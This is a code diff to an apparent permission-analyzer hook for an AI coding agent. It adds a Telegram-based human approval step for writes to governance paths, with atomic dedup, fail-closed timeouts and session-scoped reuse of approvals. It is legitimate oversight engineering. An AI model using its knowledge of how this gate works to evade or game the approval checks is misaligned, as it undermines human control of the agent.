+        # (DB + JSON mailbox) above already persist the event durably, so a
+        # dropped Telegram ping here loses no information, only immediacy.
+        result = send_telegram(msg, retries=1)
+        if not result:
+            log.warning(
+                "permission_analyzer: _notify_telegram_escalation send_telegram failed: %s",
+                result.error,
+            )
     except Exception as e:
-        log.warning("permission_analyzer: _notify_telegram_escalation send failed: %s", e, exc_info=True)  # never block the pipeline
+        log.warning(
+            "permission_analyzer: _notify_telegram_escalation send failed: %s",
+            e,
+            exc_info=True,
+        )  # never block the pipeline
 
 
-def record_decision(tool: str, inp: dict, result: dict) -> None:
+# File-based pending-approval mailbox for the inline Si/No Telegram button
+# pre_tool_use.py posts when evaluate() returns an ESCALATE whose
+# rule_triggered starts with one of these prefixes (a governance-corpus
+# write specifically — every other ESCALATE reason, e.g. repeat-rejection
+# loop-breakers or private-host WebFetch, stays plain-notify-only via
+# _notify_telegram_escalation, since those warrant deliberate review rather
+# than a quick tap). Deliberately NOT wired into evaluate()/PermissionAnalyzer
+# itself: evaluate() must stay a fast, pure, synchronously-testable function
+# (the whole test suite calls it directly with no network access) — a 45s
+# blocking network poll belongs in the one real caller (pre_tool_use.py),
+# not in the function every unit test also calls.
+#
+# Not a DB table: a new table needs a schema_v2.sql migration the human
+# applies by hand (database mutation rules, not this hook's call), so this
+# can't be built on the live DB tonight. dqiii8_bot.py's
+# handle_governance_callback() is the only other writer of these files.
+_GOVERNANCE_WRITE_RULE_PREFIXES = (
+    "governance_path:",
+    "bash_write_governance_path:",
+    "bash_sql_governance_path:",
+)
+_PENDING_APPROVALS_DIR = DQIII8_ROOT / "tasks" / "pending_approvals"
+_APPROVAL_POLL_INTERVAL_S = 0.3
+# Stays under Claude Code's default 60s PreToolUse hook timeout (no override
+# set in .claude/settings.json as of 2026-09-02 — re-verify this assumption
+# if that default ever changes, since a poll that outlives the hook timeout
+# just gets killed and denied, same as a plain ESCALATE would).
+_APPROVAL_TIMEOUT_S = 45
+
+
+def _governance_approval_id(tool: str, anchor: str) -> str:
+    """Deterministic id for a (tool, anchor) governance-write ESCALATE,
+    bucketed into _APPROVAL_TIMEOUT_S-second windows. Concurrent/rapid-fire
+    identical requests within the same window collapse onto the same id —
+    and therefore the same pending-approval file and a single Telegram ping
+    — via the atomic O_CREAT|O_EXCL claim in _request_governance_approval
+    below (a scan-then-create check has a TOCTOU race under real concurrency:
+    confirmed live, 5 parallel identical requests each saw "no pending file
+    yet" and all 5 created their own). A new window (a fresh burst after the
+    prior one resolved or expired) gets a fresh id instead of colliding with
+    a stale resolved/expired file lingering under the same name.
+    """
+    import hashlib
+    import time
+
+    bucket = int(time.time() // _APPROVAL_TIMEOUT_S)
+    return hashlib.sha256(f"{tool}|{anchor}|{bucket}".encode()).hexdigest()[:12]
+
+
+def _request_governance_approval(entry: dict) -> bool | None:
+    """Send an inline Si/No Telegram button for `entry` and block polling for
+    the tap. Returns True (approved), False (denied), or None (timed out /
+    notify failed / any error) — None means "fall back to a plain ESCALATE",
+    never "treat as approved": every failure mode here fails closed.
+    """
+    import json as _json
+    import time
+
+    anchor = _dedup_anchor(str(entry.get("action_detail") or ""))
+    approval_id = _governance_approval_id(entry.get("tool_name", ""), anchor)
+    try:
+        _PENDING_APPROVALS_DIR.mkdir(parents=True, exist_ok=True)
+    except Exception as e:
+        log.warning("permission_analyzer: _request_governance_approval mkdir failed: %s", e)
+        return None
+    path = _PENDING_APPROVALS_DIR / f"{approval_id}.json"
+
+    # Atomic claim: O_CREAT|O_EXCL is a single kernel syscall, so exactly one
+    # concurrent caller wins it (the "owner") — every other caller for the
+    # same (tool, anchor, window) gets FileExistsError and just polls the
+    # owner's file below, instead of racing a separate check-then-create.
+    owner = False
+    try:
+        fd = os.open(path, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
+        owner = True
+    except FileExistsError:
+        owner = False
+    except Exception as e:
+        log.warning("permission_analyzer: _request_governance_approval claim failed: %s", e)
+        return None
+
+    if owner:
+        try:
+            payload = {
+                "id": approval_id,
+                "status": "pending",
+                "created_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+                **entry,
+            }
+            os.write(fd, _json.dumps(payload).encode("utf-8"))
+            os.close(fd)
+        except Exception as e:
+            log.warning("permission_analyzer: _request_governance_approval write failed: %s", e)
+            return None
+
+        try:
+            import sys
+
+            sys.path.insert(0, str(DQIII8_ROOT))
+            from bin.core.notify import send_telegram
+
+            msg = (
+                "Permission ESCALATE (tap to resolve)\n"
+                f"{entry['tool_name']} -> {entry['action_detail'][:150]}\n"
+                f"Reason: {entry['reason'] or '(none)'}\n"
+                f"Rule: {entry['rule_triggered'] or '(none)'}\n"
+                f"Expires in {_APPROVAL_TIMEOUT_S}s — after that, apply the change manually."
+            )
+            reply_markup = {
+                "inline_keyboard": [
+                    [
+                        {
+                            "text": "Si, aprobar",
+                            "callback_data": f"gov_approve:{approval_id}",
+                        },
+                        {"text": "No, denegar", "callback_data": f"gov_deny:{approval_id}"},
+                    ]
+                ]
+            }
+            result = send_telegram(msg, reply_markup=reply_markup)
+            if not result:
+                log.warning(
+                    "permission_analyzer: _request_governance_approval notify failed: %s",
+                    result.error,
+                )
+        except Exception as e:
+            log.warning("permission_analyzer: _request_governance_approval notify failed: %s", e)
+            # Still poll below: the operator may resolve it some other way even
+            # if the notify itself failed (e.g. re-running this exact call after
+            # noticing the pending-approval file by hand).
+
+    deadline = time.monotonic() + _APPROVAL_TIMEOUT_S
+    while time.monotonic() < deadline:
+        try:
+            status = _json.loads(path.read_text()).get("status")
+        except Exception:
+            status = "pending"
+        if status == "approved":
+            return True
+        if status == "denied":
+            return False
+        time.sleep(_APPROVAL_POLL_INTERVAL_S)
+    return None
+
+
+def record_decision(tool: str, inp: dict, result: dict, session_id: str | None = None) -> None:
     """
     Records APPROVE decisions in the DB.
     For LOW risk approvals: auto-learns the pattern in learned_approvals
@@ -3262,7 +4567,7 @@ def record_decision(tool: str, inp: dict, result: dict) -> None:
             VALUES (?, ?, ?, ?, ?, ?)
             """,
             (
-                SESSION_ID,
+                session_id or SESSION_ID,
                 tool,
                 action_detail,
                 "APPROVE",
@@ -3271,10 +4576,7 @@ def record_decision(tool: str, inp: dict, result: dict) -> None:
             ),
         )
         # Auto-learning for low-risk patterns
-        if (
-            result.get("risk_level") == "LOW"
-            and result.get("reason") != "learned_approval"
-        ):
+        if result.get("risk_level") == "LOW" and result.get("reason") != "learned_approval":
             pattern = action_detail[:50].strip()
             if pattern:
                 conn.execute(
@@ -3301,6 +4603,35 @@ def record_decision(tool: str, inp: dict, result: dict) -> None:
         conn.close()
     except Exception as e:
         log.warning("permission_analyzer: record_decision DB write failed: %s", e, exc_info=True)
+
+
+def _session_has_telegram_approval(tool: str, anchor: str, session_id: str) -> bool:
+    """True if this exact governance action (by _dedup_anchor) was already
+    approved via the inline Telegram Si/No button earlier in this same
+    session — "continued permission for this task" (2026-09-04): a
+    retried/near-identical action then auto-approves immediately instead of
+    re-sending the 45s Telegram request, and — just as important — is never
+    recorded as a fresh rejection either, so it can't accumulate toward the
+    separate repeat-rejection loop-breaker (MAX_SAME_REJECTION) the way a
+    genuinely denied action does. Looks only at APPROVE rows tagged with the
+    'human_approved_via_telegram' reason prefix pre_tool_use.py writes after
+    a real tap — never at plain APPROVE rows from unrelated causes.
+    """
+    try:
+        conn = sqlite3.connect(str(DB_PATH), timeout=5)
+        rows = conn.execute(
+            """
+            SELECT action_detail FROM permission_decisions
+            WHERE session_id = ? AND tool_name = ? AND decision = 'APPROVE'
+              AND reason LIKE 'human_approved_via_telegram%'
+              AND timestamp > datetime('now', '-2 hours')
+            """,
+            (session_id, tool),
+        ).fetchall()
+        conn.close()
+    except Exception:
+        return False
+    return any(_dedup_anchor(stored or "") == anchor for (stored,) in rows)
 
 
 def record_rejection(tool: str, inp: dict, result: dict, session_id: str | None = None) -> None:
@@ -3378,7 +4709,11 @@ def record_rejection(tool: str, inp: dict, result: dict, session_id: str | None 
         conn.commit()
         conn.close()
     except Exception as e:
-        log.warning("permission_analyzer: record_rejection DB channel write failed: %s", e, exc_info=True)
+        log.warning(
+            "permission_analyzer: record_rejection DB channel write failed: %s",
+            e,
+            exc_info=True,
+        )
 
     # Channel 2: JSON mailbox (append to array)
     try:
@@ -3397,7 +4732,11 @@ def record_rejection(tool: str, inp: dict, result: dict, session_id: str | None 
             encoding="utf-8",
         )
     except Exception as e:
-        log.warning("permission_analyzer: record_rejection JSON mailbox write failed: %s", e, exc_info=True)
+        log.warning(
+            "permission_analyzer: record_rejection JSON mailbox write failed: %s",
+            e,
+            exc_info=True,
+        )
 
     # Channel 3: Telegram (ESCALATE only — DENY is final, needs no operator action)
     if entry["decision"] == "ESCALATE":
